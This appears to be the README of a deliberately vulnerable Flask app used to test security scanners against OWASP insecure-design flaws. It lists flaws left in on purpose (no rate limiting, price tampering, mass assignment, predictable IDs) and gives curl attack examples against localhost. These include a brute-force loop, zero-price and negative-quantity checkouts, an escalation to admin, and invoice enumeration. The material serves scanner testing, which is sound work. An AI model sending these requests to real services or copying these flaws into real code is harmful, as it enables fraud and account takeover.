# OWASP A04:2025 - Insecure Design

> **WARNING: This repository contains INTENTIONALLY VULNERABLE code for security scanner testing. DO NOT deploy to production.**

## Vulnerabilities Included

- **No rate limiting** – Login allows unlimited brute force, no throttling
- **No account lockout** – `failed_logins` tracked but never blocks
- **Insecure password reset** – 6-digit OTP returned in response body, no expiry
- **Business logic: price tampering** – Client supplies item price in checkout request
- **Business logic: negative quantity** – Negative quantity results in negative total (free items)
- **Unrestricted file upload** – Accepts any file extension including `.php`, `.py`, `.sh`
- **Excessive data exposure** – `/api/users/<id>` returns `password` and `internal_notes`
- **Mass assignment** – PUT `/api/users/<id>` applies all fields including `role` and `balance`
- **Predictable IDs** – Invoice IDs are sequential integers (IDOR-friendly)

## Stack
Python 3 / Flask

## Setup
```bash
pip install -r requirements.txt
python app.py
```

## Attack Examples
```bash
# Brute force login - no lockout
for pass in admin123 password letmein 123456; do
  curl -s -X POST http://localhost:5004/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":\"$pass\"}"
done

# Price tampering - buy item for $0
curl -X POST http://localhost:5004/api/checkout \
  -H "Content-Type: application/json" \
  -d '{"user_id":2,"items":[{"id":1,"price":0,"quantity":1}]}'

# Negative quantity - get money back
curl -X POST http://localhost:5004/api/checkout \
  -H "Content-Type: application/json" \
  -d '{"user_id":2,"items":[{"id":1,"price":9.99,"quantity":-100}]}'

# Mass assignment - escalate to admin
curl -X PUT http://localhost:5004/api/users/2 \
  -H "Content-Type: application/json" \
  -d '{"role":"admin","balance":999999}'

# Invoice enumeration
for i in $(seq 1 50); do curl -s http://localhost:5004/api/invoices/$i; done
```
